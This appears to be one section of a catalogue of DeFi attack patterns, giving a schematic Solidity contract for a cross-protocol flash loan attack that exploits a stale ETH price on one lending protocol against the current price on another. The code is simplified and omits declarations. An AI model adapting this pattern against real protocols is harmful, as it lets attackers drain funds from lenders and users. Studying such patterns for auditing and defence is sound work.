## 7. Cross-Protocol Flash Loan Attack

```solidity
// Exploiting price discrepancy across protocols
contract CrossProtocolAttack {
    function attack() external {
        // 1. Flash loan from Aave
        aave.flashLoan(this, USDC, 10_000_000e6, "");
    }
    
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 2. Protocol A prices ETH at $2000 (outdated)
        protocolA.depositCollateral(USDC, amounts[0]);
        protocolA.borrow(ETH, 5000e18);  // Borrow at $2000
        
        // 3. Protocol B prices ETH at $2100 (current)
        ETH.approve(address(protocolB), 5000e18);
        protocolB.depositCollateral(ETH, 5000e18);
        protocolB.borrow(USDC, 10_500_000e6);  // Borrow at $2100
        
        // 4. Repay flash loan + fee, keep difference
        USDC.approve(address(aave), amounts[0] + premiums[0]);
        
        return true;
    }
}
```

